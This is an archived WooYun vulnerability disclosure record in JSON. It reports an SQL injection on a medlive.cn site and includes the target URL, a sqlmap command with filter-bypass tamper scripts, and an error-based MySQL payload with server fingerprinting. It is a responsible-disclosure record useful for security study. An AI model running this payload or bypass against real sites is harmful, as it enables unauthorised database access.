{"id": 30733, "wybug_id": "wooyun-2015-0115873", "wybug_title": "医脉通某站存在SQL注入之八（已经修复再绕过注入）", "wybug_corp": "medlive.cn", "wybug_author": "Ch4r0n", "wybug_date": "2015-05-25 17:59", "wybug_open_date": "2015-07-11 11:24", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-11：\t细节向公众公开  简要描述： 之前测试过，返回应该是空白的信息，但是这次直接返回错误，而且被过滤了一些字符，要绕过才行！~~~ 详细说明：  地址\nhttp://diy.medlive.cn/?file=diy&action=manage\n测试12'返回错误信息，估计存在注入（这个应是被修复了，因为之前没有修复前，返回的是空白，现在返回错误）\n\n\n\n之前返回空白\n\n抓包在burpsuite上测试加'和没有加返回结果\n\n\n\n上神器sqlmap，如果只是简单的 -r 地址 --dbms这些的话，是无法注入的，那么只能绕过，添加一些参数测试吧，这里不知道添加那个参数合适，那就几个都上吧 \n--threads 10 --dbms \"MySQL\" --level 5 --tamper  between.py,space2comment.py,randomcase.py,_space20a.py --risk 2 -psearch_text\n\n\n\n\n\n\n\n\n\n\nPS:修复前的测试，因已经提交过，就没有提交了，从这次绕过来看，反而比修复前获取数据更快\nPlace: POSTParameter: search_text    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: search_text=12' AND (SELECT 4913 FROM(SELECT COUNT(*),CONCAT(0x7178746f71,(SELECT (CASE WHEN (4913=4913) THEN 1 ELSE 0 END)),0x7176617071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'uwLT'='uwLT&type=new---web server operating system: Linux CentOS 6.3web application technology: Apache 2.2.15back-end DBMS: MySQL 5.0\n   漏洞证明：  \n\n\n\n   修复方案：  你们懂得如何修复！~~~   版权声明：转载请注明来源 Ch4r0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-05-27 11:22 厂商回复： 谢谢，我们正在紧急修复中。。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}